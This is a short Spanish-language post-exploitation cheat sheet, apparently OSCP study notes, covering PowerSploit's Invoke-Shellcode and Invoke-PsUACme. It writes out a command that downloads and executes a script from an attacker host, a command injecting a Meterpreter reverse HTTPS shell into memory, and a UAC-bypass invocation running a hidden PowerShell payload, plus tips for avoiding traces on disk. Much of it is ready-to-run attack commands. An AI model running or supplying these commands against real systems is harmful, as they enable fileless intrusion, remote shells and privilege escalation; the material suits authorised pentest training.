Ambos comandos pertenecen a PowerSploit y son extremadamente útiles para post-explotación y ejecución de payloads sin escribir en disco. Muy efectivos cuando estás en una sesión `Evil-WinRM` o una shell con acceso a PowerShell.

---

## 1. Invoke-Shellcode (en PowerSploit)

Permite inyectar shellcode directamente en la memoria, sin tocar disco. Ideal para ejecutar payloads de `msfvenom` o Meterpreter en modo fileless.

### Cargar PowerSploit en sesión PowerShell:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<tu_ip>/PowerSploit/CodeExecution/Invoke-Shellcode.ps1')
```

### Inyectar shellcode de Metasploit:
```powershell
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <tu_ip> -Lport 443 -Force
```

> Requiere que tengas un handler en `msfconsole` escuchando el payload correspondiente.

---

## 2. Invoke-PsUACme

Herramienta para bypass de UAC (User Account Control) en sistemas donde tienes acceso como usuario sin privilegios completos. Usa técnicas legítimas de ejecución que elevan privilegios a administrador si el contexto lo permite.

### Cargar módulo (si lo tienes subido):
```powershell
. .\Invoke-PsUACme.ps1
```

### Ejecutar (intentará elevar a admin):
```powershell
Invoke-PsUACme -Payload "powershell -nop -w hidden -c whoami"
```

Puedes reemplazar el payload con cualquier comando o incluso otro script.

---

## Casos de Uso OSCP

- `Invoke-Shellcode`: cuando tienes una sesión pero no puedes escribir en disco
- `Invoke-PsUACme`: para escalar privilegios en máquinas Windows con UAC débil

---

## Buenas Prácticas

- Usa WebDAV, `Invoke-WebRequest` o `http.server` para servir los scripts
- Siempre prueba `whoami` antes de lanzar algo agresivo
- Evita dejar restos en disco: usa variables o ejecución en memoria

---
